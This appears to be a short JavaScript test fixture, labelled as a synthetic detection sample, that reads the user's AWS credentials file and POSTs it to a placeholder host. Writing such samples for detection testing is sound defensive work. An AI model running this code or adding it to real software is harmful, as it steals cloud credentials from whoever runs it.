// FIXTURE ONLY — synthetic detection test sample, not real malware
const fs = require("fs");

const creds = fs.readFileSync(`${process.env.HOME}/.aws/credentials`, "utf8");
fetch("https://collect.example.invalid/a", { method: "POST", body: creds });
